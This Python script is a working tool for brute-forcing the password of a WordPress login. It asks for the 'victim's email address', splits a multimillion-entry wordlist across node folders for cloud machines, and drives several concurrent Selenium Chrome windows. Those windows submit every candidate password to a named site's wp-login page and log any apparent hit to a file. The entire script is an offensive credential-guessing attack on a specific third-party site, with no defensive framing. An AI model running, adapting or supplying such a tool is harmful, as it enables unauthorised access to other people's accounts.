from __future__ import print_function
import threading,os,random,datetime,selenium,requests
import time
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException

def validator(ques):
    ans=input(ques)
    if len(ans)==0:
        print("[!] Please enter atleast something! ")
        return validator(ques)
    elif " "in list(ans):
        print("[!] Please do not include whitespace! ")
        return validator(ques)
    elif "@"not in list(ans):
        print("[!] Please include '@'!")
        return validator(ques)
    elif "."not in list(ans):
        print("[!] Please include '.'!")
        return validator(ques)
    else:
        if "."in ans.split("@")[0]:
            print("[!] Please include '.' after the '@'!")
            return validator(ques)
        else:
            if ans.count("@")!=1 and ans.count(".")<1:
                print("[!] Please only include one '@' and atleast one '.'!")
                return validator(ques)
            else:
                if ans.split("@")[1][0]==".":
                    print("[!] Please enter a domain e.g.: 'gmail' or 'protonmail'!")
                    return validator(ques)
                else:
                    if len(ans.split(".")[1])==0:
                        print("[!] Please enter an email ending e.g.: '.com' or 'org.uk'!")
                        return validator(ques)
                    else:
                        k=""
                        while (k:=input(f"? Confirm email: {ans} (Y/N) ")) not in ["Y","N"]:print("[!] Please enter either 'Y' or 'N'!")
                        if k=="Y":
                            return ans
                        else: return validator(ques)
print(fr'{os.getcwd()}')			
list_of_wl_files=[]
for file in os.listdir(fr'{os.getcwd()}'+r"\ignore_modules"+r"\wordlist_separator"):
	if file.startswith("Wordlist"):
		with open(fr'{os.getcwd()}'+r"\ignore_modules"+r"\wordlist_separator"+r"\\"+file+r"\email.txt","r")as nametemps:temps=nametemps.readlines()[0][:-1]
		list_of_wl_files.append(file+"("+temps+")")
make_new=1
if len(list_of_wl_files)!=0:
	choose_existing=""
	while(choose_existing:=input("[=] Would you like to use a wordlist that's already been created? (Y/N) "))not in ["Y","N"]:print("[!] Please enter either 'Y' or 'N'!")
	if choose_existing=="Y":
		for x,y in enumerate(list_of_wl_files):print(str(x+1)+": "+y)
		print(str(len(list_of_wl_files)+1)+": Cancel- Create new wordlist")
		while(picked:=input("[=] Please enter your selection from above: "))not in[str(x)for x in range(1,len(list_of_wl_files)+2)]:print("[!] Please enter from 1 to "+str(len(list_of_wl_files)+1)+"!")
		if int(picked)==len(list_of_wl_files)+1:make_new=1
		else:
			with open(fr'{os.getcwd()}'+r"\ignore_modules"+r"\wordlist_separator"+r"\\"+(use:=list_of_wl_files[int(picked)-1].split("(")[0])+r"\email.txt","r")as hold:target,make_new=hold.readlines()[0],0
else:
	print("[=] You have no wordlists. I will create one for you. ")
if make_new:

	nodes=2 

	target=validator("[=] Enter the victim's email address: ")
	victim=target[:2].upper()
	start=time.time()
	if os.path.exists(fr'{os.getcwd()}'+r"\ignore_modules"+r"\wordlist_separator\Wordlist"+victim):pass
	else:
		if not os.path.exists(fr'{os.getcwd()}'+r"\ignore_modules"+r"\wordlist_separator\Wordlist"+victim):
			os.mkdir(fr'{os.getcwd()}'+r"\ignore_modules"+r"\wordlist_separator\Wordlist"+victim)
			for x in range(1,nodes+1):os.mkdir(fr'{os.getcwd()}'+r"\ignore_modules"+r"\wordlist_separator\Wordlist"+victim+r"\node"+str(x))
		else:
			print("[!] A wordlist for the initials: "+victim+" already exists. I am overwriting this wordlist.")
		with open(fr'{os.getcwd()}'+r"\ignore_modules"+r"\wordlist_separator\Wordlist"+victim+r"\email.txt","w")as file:file.write(target)
		with open(fr'{os.getcwd()}'+r"\ignore_modules"+r"\wordlist_separator\parent_wordlist.txt","r") as openagain:alist2=[py.split("\n")[0] for py in openagain.readlines()]
		all_files_seperated=[]
		attempts=len(alist2)
		attempts_pernode=int(6794000/nodes)
		files_pernode=50
		attempts_perfile=int(attempts_pernode//files_pernode)
		for obj in range(files_pernode*nodes):all_files_seperated.append(alist2[obj*attempts_perfile:(obj+1)*attempts_perfile])

		def make_node_folder(master_wordlist,victim,node,files_pernode):
			wordlist_to_write=master_wordlist[files_pernode*(node-1):files_pernode*(node)]

			for x,y in enumerate(wordlist_to_write):
				with open(fr'{os.getcwd()}'+r"\ignore_modules"+r"\wordlist_separator\Wordlist"+victim+r"\node"+str(node)+r"\wl"+str(x+1)+".txt","w")as file:
					for r in y:file.write(r+"\n")
		for g in range(1,nodes+1):make_node_folder(all_files_seperated,victim,g,files_pernode)


		print("[=] Taken: "+str(time.time()-start)+" seconds to create wordlists divided into "+str(nodes)+" 'node' folders in case you're using AWS Cloud machines. ")
	use="Wordlist"+victim
print("\n[=] Using "+use+" to attack "+target+". ")
while(cont:=input("[=] Continue? (Y/N) "))not in ["Y","N"]:print("[!] Please enter either 'Y' or 'N'! ")
if cont=="N":
	print("[=] Exiting.")
	quit()


CHROME_DVR_DIR = fr'{os.getcwd()}'+r"\ignore_modules"+r"\chromedriver.exe"
optionss = webdriver.ChromeOptions()
optionss.add_argument("--disable-popup-blocking")
optionss.add_argument("--disable-extensions")
optionss.add_experimental_option('excludeSwitches', ['disable-logging'])
count,stopper,COUNTERRRR,page=1,0,1,0

def done(diditwork,target,assumed_index,big_list,wordlist_name):
	if diditwork:
		with open(fr'{os.getcwd()}'+r"\possible_passwords.txt","a")as file:
			if assumed_index==len(big_list)-1:file.write("Key for: "+target+" could be: '"+big_list[assumed_index-1]+"' or '"+big_list[assumed_index]+" .")
			elif assumed_index==len(big_list):file.write("Key for: "+target+" could be: '"+big_list[assumed_index]+" .")
			else:file.write("Key for: "+target+" could be: '"+big_list[assumed_index-1]+"' or '"+big_list[assumed_index]+"' or '"+big_list[assumed_index+1]+" .")
	os.remove(fr'{os.getcwd()}'+fr"\ignore_modules\wordlist_separator\\"+wordlist_name)

def create_session(num,master_list,numberofpages,target,wordlist_name):
	browser=webdriver.Chrome(CHROME_DVR_DIR)
	browser.minimize_window()
	browser.get("https://www.my-gcsescience.com/wp/wp-login.php")
	class_list=master_list[num*(int(len(master_list)//numberofpages)):((num+1)*(int(len(master_list)//numberofpages)))+1]
	method(browser,class_list,target,wordlist_name)
def method(browser,class_list,target,wordlist_name):
	yes,foundpass=1,"Not Found"
	count=-1
	once=len(class_list)
	browser.minimize_window()
	username=browser.find_element(By.CSS_SELECTOR,"#user_login")
	username.send_keys(target)
	while yes and count!=once:
			timeout=0
			#if browser.current_url!="https://www.my-gcsescience.com/wp/wp-login.php":
			#	page_loaded=0
			#	while not page_loaded:
			#		try:
			#			breaker = WebDriverWait(browser, 1).until(EC.presence_of_element_located((By.ID, 'IdOfMyElement')))
			#			page_loaded=1
			#		except TimeoutException:
			#			page_loaded=1
			#			t.sleep(1)
			try:
				
				if browser.current_url=="https://www.my-gcsescience.com/my-account/":
					done(1,target,count,class_list,wordlist_name)
					print(class_list[count-1])
					quit()
				else:
					password=browser.find_element(By.CSS_SELECTOR,"#user_pass")
					if count==once:
						print(0,None,None,None,wordlist_name)
						quit()
					elif browser.current_url!="https://www.my-gcsescience.com/my-account/":
						password.send_keys(class_list[count])
						password.send_keys(Keys.RETURN)
						print("Tried:"+class_list[count])
						count+=1
					else:
						foundpass=class_list[count]
						yes=0
			except selenium.common.exceptions.NoSuchElementException:
				if timeout>2500:quit()
				else:timeout+=1
	print(foundpass)

list_of_wl_files=[]
list_of_node_files=[]
for file in os.listdir(fr'{os.getcwd()}'+r"\ignore_modules"+r"\wordlist_separator\\"+use):
	if file.startswith("node"):
		list_of_node_files.append(file)
for x,y in enumerate(list_of_node_files):print(str(x+1)+": "+y)
while(picked_node:=input("[=] Please enter your selection from above: "))not in[str(x)for x in range(1,len(list_of_node_files)+1)]:print("[!] Please enter from 1 to "+str(len(list_of_node_files))+"!")
with open(fr'{os.getcwd()}'+r"\ignore_modules"+r"\wordlist_separator\\"+use+r"\email.txt","r")as hold:target,make_new=hold.readlines()[0],0

for file in os.listdir(fr'{os.getcwd()}'+r"\ignore_modules"+r"\wordlist_separator\\"+use+r"\node"+str(picked_node)):
	if file.startswith("wl"):
		list_of_wl_files.append(file)
wordlist_name=list_of_wl_files[0]
with open(fr'{os.getcwd()}'+r"\ignore_modules"+r"\wordlist_separator\Wordlist"+target[:2].upper()+r"\node"+str(picked_node)+r"\wl"+wordlist_name[2:],"r")as file:master_list=[py.split("\n")[0]for py in file.readlines()]


listofpages=[]
while not(numberofpages:=input("\n[=] Please enter the number of concurrent (simultaneous) windows to divide the labour of attempting "+str(len(master_list))+" passwords: ")).isnumeric():print("[!] Enter a number!")
numberofpages=int(numberofpages)

#for num in range(numberofpages):listofpages.append(threading.Thread(target=create_session(num,master_list,numberofpages,target)))
for num in range(numberofpages):listofpages.append(threading.Thread(target=create_session,args=(num,master_list,numberofpages,target,wordlist_name),daemon=False))
for object in listofpages:object.start()





